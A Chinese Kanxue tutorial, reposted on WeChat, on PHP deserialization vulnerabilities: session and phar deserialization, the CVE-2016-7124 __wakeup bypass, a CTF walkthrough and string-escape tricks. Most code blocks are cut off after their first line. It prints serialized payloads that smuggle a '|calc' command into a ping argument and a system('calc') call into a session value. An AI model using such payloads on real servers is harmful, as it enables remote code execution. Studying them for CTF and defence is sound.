# 

H3h3QAQ 看雪学苑

 _2021年10月14日 18:03_

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/kR3MmOkZ9r7qk7AhUjdqLd8k4ESVIvT4JhqXQbia6JxRImV3fLibCv8Y0hhiblMVQqU2WLN6rVnzMFvNy3dNKeb1g/640?wx_fmt=jpeg&wxfrom=13&tp=wxpic)  

本文为看雪论坛精华文章  
看雪论坛作者ID：H3h3QAQ

  

  

**PHP序列化与序列化**

  

## **一、PHP序列化和反序列化**

###   

### **1、PHP反序列化：**

  

serialize()

将变量或者对象转换成字符串的过程，用于存储或传递PHP的值的过程种，同时不丢失其类型和结构。

常见的序列化字母表示及其含义：

```
a - array    ----->a:<n>:{<key 1><value 1>...<key n><value n>}
```

```
<?php
```

  

序列化运行结果为：

```
O:2:"h3":8:{s:2:"v1";N;s:2:"v2";b:0;s:2:"v3";i:1;s:2:"v4";d:2.1;s:2:"v5";a:0:{}s:2:"v6";s:7:"h3h3QAQ";s:6:" h3 v7";s:7:"H3h3QAQ";s:5:" * v8";s:9:"protected";}
```

  

反序列化运行结果

```
object(h3)#1 (8) {
```

####   

#### （1）各种魔术方法

```
__destruct()：//析构函数当对象被销毁时会被自动调用
```

  

当PHP5<5.6.25、PHP7<7.0.1时，当成员属性数目大于实际数码时可绕过__wakeup方法（CVE-2016-7124）

  

#### （2）PHP反序列化特性

  

①PHP在反序列化时，底层代码时以;作为字段的分隔，以}作为结尾（字符串除外），并且是根据长度判断内容的。

②在反序列的时候php会根据s所指定的字符长度去读取后面的字符。如果指定的长度错误则反序列化就会失败。

③对类中不存在的属性也会进行反序列化。

###   

### **2、session反序列化**

  

#### （1）session概念

  

PHP session时一个特殊的变量，用于存储有关用户会话的信息，或更改用户会话的设置。session变量保存的信息是单一用户的，并且可供应用程序中的所有界面使用。它每个访问或者创建都有唯一的id（UID），并基于这个UID来储存变量。UID储存在cookie中，或者通过URL来进行传导。

  

#### （2）会话过程

  

当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果请求中不包括会话ID信息，PHP就会创建一个新的会话。会话开始之后，PHP就会将会话中的数据设置到$_SESSION变量中。当PHP停止的时候，它会自动读取$_SESSION中的内容，并将其进行序列化，然后发送会话保存管理器来进行保存。

默认情况下，PHP使用内置的文件会话保存管理器（files）来完成会话的保存。可以通过调用函数session_start()来手动开始一个会话。如果配置项session.auto_start设置为1，那么请求开始的时候，会话会自动开始。

PHP脚本执行完毕之后，会话会自动关闭。同时，也可以通过调用函数session_write_close()来手动关闭会话。

  

#### （3）存储引擎

  

PHP中的session中的内容默认是以文件的方式储存，储存方式是由配置项session.save_handler来进行确定的，默认是以文件的方式储存。储存的文件是以sess_PHPSESSID来进行命名的，文件的内容就是session值得序列化之后得内容。

session.serialize_handler有如下三种取值：

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

```
<?php
```

  

每种存储引擎存储的内容格式：

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

###   

### **3、phar反序列化**

  

phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起php对象注入漏洞。

phar文件的结构：

```
-stub：phar文件标识，前面内容不限，但是必须以__HALT_COMPILER();?>来结尾，否则phar扩展将无法识别这个文件为phar文件
```

  

生成phar文件

```
一定要将php.ini中的phar.readonly选项设置为Off
```

```
<?php
```

##   

  

## **二、反序列化漏洞**

  

### **1、反序列化成因**

  

主要是反序列化过程中某些参数可控，传入构造的字符串，从而控制内部的变量设置函数，执行想要的操作。

  

#### （1）phar反序列化漏洞造成原因

  

漏洞出发点在使用phar://协议读取文件的时候，文件内容黑背解析成为phar对象，然后phar对象内的Meta-data信息会被反序列化。当内核调用phar_parse_metadata()解析met-adata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成漏洞

###   

### **2、反序列化漏洞**

####   

#### （1）PHP反序列化漏洞

```
<?php
```

  

我们可以简单的分析一下代码。

定义了一个class类，类中有两个私有变量method和args。

有三个魔术方法：

```
function __construct($method, $args)  //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用
```

  

分析代码段中host的来源，想办法利用system()构成RCE。

```
<?php
```

  

我们观察代码可知：

GET方法获取参数a，并且将其反序列化。

但是再执行反序列化的时候，会自动调用__wakeup()魔术方法，把args的值改为127.0.0.1。

无论我们怎么构造payload，system()执行的命令都是ping -c 2 127.0.0.1。

这时我们可以利用到CVE-2016-7124漏洞。

> 适用版本：PHP5<5.6.25、PHP7<7.0.1 当成员属性数目大于实际数码时可绕过__wakeup方法

  

就可以构造恶意payload来RCE。

这里还有个小知识点|管道符：

```
把一个命令的标准输出传送到另一个命令的标准输入中，连续的|意味着第一个命令的输出为第二个命令的输入，第二个命令的输入为第一个命令的输出。
```

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

所以我们可以构造序列化了：

```
<?php
```

```
O:4:"home":2:{s:12:" home method";s:4:"ping";s:10:" home args";a:1:{i:0;s:7:"|calc";}}
```

  

需要跳一下__wakeup()把成员属性数目改为3。

```
O:4:"home":3:{s:12:" home method";s:4:"ping";s:10:" home args";a:1:{i:0;s:7:"|calc";}}
```

  

URL编码一下：

```
O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A4%3A%22ping%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A5%3A%22%7Ccalc%22%3B%7D%7D
```

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

成功RCE。

####   

#### （2）session反序列化漏洞

  

当网站序列化存储session与反序列化读取session方式不同时，就可能导致session反序列化漏洞的产生。一般都是以php_serialize序列化存储session，以PHP反序列化读取session，造成反序列化攻击。

例子：

phpinfo：

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

s1.php：

```
<?php
```

  

s2.php：

```
<?php
```

  

这里需要说一下unserialize的特性，在执行unserialize的时候，如果字符串前面满足了可被序列化的规则，则后学的字符就会被忽略。

```
a:1:{s:2:"h3";s:52:"|O:7:"session":1:{s:3:"var";s:15:"system('calc');";}";}
```

  

exp：

```
<?php
```

  

执行结果：

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

上文可以给$_SESSION赋值，若代码中不存在给$_SESSION赋值可以利用uplode_process机制，可以在$_SESSION中创建一个键值对，其中的值可以控制。

```
<?php
```

####   

#### （3）phar反序列化

  

利用条件：

```
-phar文件能够上传到服务器
```

  

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

  

##### 例题:

[SWPUCTF 2018]SimplePHP

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

存在任意文件读取。

先来读取一下upload_file.php。

```
<?php
```

  

再来读取一下function.php。

```
<?php
```

  

再读取一下base.php。

发现了提示：

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

回头再来看class.php。

```
<?php
```

  

在Test类中存在敏感操作：

```
public function file_get($value)
```

  

可以反向推poc链。

通过file_get_content来读取我们想要的文件，也就是调用file_get函数，之前分析得知__get->get->file_get，所以关键是触发__get方法，那么就要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的__tostring方法。

```
class Show
```

  

查看一下怎么能够触发__toString()方法：

```
public function __destruct()
```

  

知要echo test即可。

整条链子为：

```
C1e4r::destruct() -> Show::toString() -> Test::__get()
```

  

exp如下：

```
<?php
```

  

修改生成得phar文件后缀。

上传成功后回到文件读取点来读phar文件。

拿到base64加密得flag。

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

#   

  

# **反序列化字符逃逸**

##   

## **一、概念**

  

在反序列化前，对序列化后的字符串进行替换或者修改，使得字符串的长度发生了变化，通过构造特定的字符串，导致对象注入等恶意操作。

  

  

## **二、字符变多**

  

例子：

该题源码如下：

```
<?php
```

  

文件包含了flag。

然后filter()方法，会将序列化字符串中的x替换为yy，可能会导致字符串长度。

我们试着传入u=admin。

序列化为：

```
a:2:{i:0;s:5:\"admin\";i:1;s:3:\"aaa\";}
```

  

反序列化后：

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

a[1]不等于"admin" 没有满足条件。

我们构造一下数组：

```
<?php
```

```
a:2:{i:0;s:1:"a";i:1;s:5:"admin";}
```

  

但是我们只有一个参数username可控。

可以利用字符串逃逸。

复制自己想要构造的字符串。

```
";i:1;s:5:"admin";}
```

  

按照长度添加字符串，已知长度为19。

则在前方填充19个x。

```
'xxxxxxxxxxxxxxxxxxx";i:1;s:5:"admin";}
```

  

测试一下：

```
<?php
```

  

运行结果：

```
a:2:{i:0;s:38:"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";i:1;s:5:"admin";}";i:1;s:1:"a";}
```

  

可以看到已经逃逸出来了。

这里利用了序列化的特性。

反序列化看一下：

```
array(2) {
```

  

可以观察整个数据的变化：

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

成功逃逸。获得flag。

##   

  

## **三、字符变少**

  

也是拿一道题做例子：

```
<?php
```

  

跟上一道题差不多。

先随意构造一下争取的payload：

```
<?php
```

  

运行后拿到所需部分：

```
";i:2;s:5:"admin";}
```

  

需要我们传入的payload。

```
u=xxx&p=xxxx
```

  

已知两个可控值中间的部分不变（可能会多一位）。

```
";i:1;s:1:"
```

  

这里可以利用替换方法换成空值从而完成逃逸。

```
<?php
```

  

执行结果：

```
a:3:{i:0;s:12:"secsecsecsec";i:1;s:31:"";i:1;s:1:"p";i:2;s:5:"admin";}";i:2;s:5:"admin";}
```

  

可以看到已经完成了逃逸。

反序列化一下看看：

```
array(3) {
```

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

a[2]=admin 拿到flag。

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)  
目前先更新这么多，未来还会继续添加。

  

  

  

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E) 

  

**看雪ID：H3h3QAQ**

https://bbs.pediy.com/user-home-921448.htm

*本文由看雪论坛 H3h3QAQ 原创，转载请注明来自看雪社区

  

  

[![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458395632&idx=1&sn=34f2b52324f54626d84b46a430f35ed2&chksm=b18f137a86f89a6cb696f51c149732d6d1b428cde53e1fe8bb209ddc228c3774094515af9c79&scene=21#wechat_redirect)

  

[![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458387399&idx=2&sn=38495add2a3a3677b2c436581c07e432&scene=21#wechat_redirect)

  

**#** **往期推荐**

1.[dll注入&代码注入 学习总结](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458396869&idx=2&sn=5d45dcb031a713b6eabbf9de24d6b621&chksm=b18f184f86f89159c0e48ec612292f12edbe89e9437dfbdde87c33797daba97cbb7b39807326&scene=21#wechat_redirect)  

2.[栈溢出漏洞利用（绕过ASLR）](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458396195&idx=2&sn=3517949e465cddf16e347f801bfebe1f&chksm=b18f16a986f89fbf85b00510bee4577728c95cc58d9be79a2b5f09896c5c44f691c637791853&scene=21#wechat_redirect)

3.[大杀器Unidbg真正的威力](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458395762&idx=2&sn=f9662663e130096ffd01c86658813742&chksm=b18f14f886f89dee2fbc6e37a4aae1252e578f2a4abeae40b238a3f850069bd25c10a226000e&scene=21#wechat_redirect)

4.[羊城杯 re wp](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458395755&idx=1&sn=6d3f6b3982dc3502de916804cc187212&chksm=b18f14e186f89df790c9a17d84cf160923681f983079c66898b32011017c43f8ba82fde18143&scene=21#wechat_redirect)

5.[CVE-2021-26708 利用四字节释放特定地址，修改内存](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458395754&idx=3&sn=1b358c56e514339cf1f5878cd6c3808f&chksm=b18f14e086f89df62f35494f35069c67f8282c0b8bea828638a3d9adff360728bcabd40c5b18&scene=21#wechat_redirect)

6.[网刃杯逆向wp](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458395749&idx=2&sn=61748462676c58bc81e29da5e5ccea1b&chksm=b18f14ef86f89df93fb631b469833d2c9fe237b588eaf1dfab0389603ebc61350c01e445b37e&scene=21#wechat_redirect)

  

  

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

公众号ID：ikanxue  

官方微博：看雪安全

商务合作：wsc@kanxue.com

  

  

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

**球分享**

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

**球点赞**

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

**球在看**

  

  

![图片](data:image/svg+xml,%3C%3Fxml version='1.0' encoding='UTF-8'%3F%3E%3Csvg width='1px' height='1px' viewBox='0 0 1 1' version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ctitle%3E%3C/title%3E%3Cg stroke='none' stroke-width='1' fill='none' fill-rule='evenodd' fill-opacity='0'%3E%3Cg transform='translate(-249.000000, -126.000000)' fill='%23FFFFFF'%3E%3Crect x='249' y='126' width='1' height='1'%3E%3C/rect%3E%3C/g%3E%3C/g%3E%3C/svg%3E)

点击“阅读原文”，了解更多！

阅读原文

阅读 2001

​

写留言

[](javacript:;)

![](http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EGLfh77kFmnicd9WOic2ibvhCibFdB4bL4srJCgo2wnvdoXLxpIvAkfCmmcptXZB0qKWMoIP8iaibYN2FA/300?wx_fmt=png&wxfrom=18)

看雪学苑

211

写留言

写留言

**留言**

暂无留言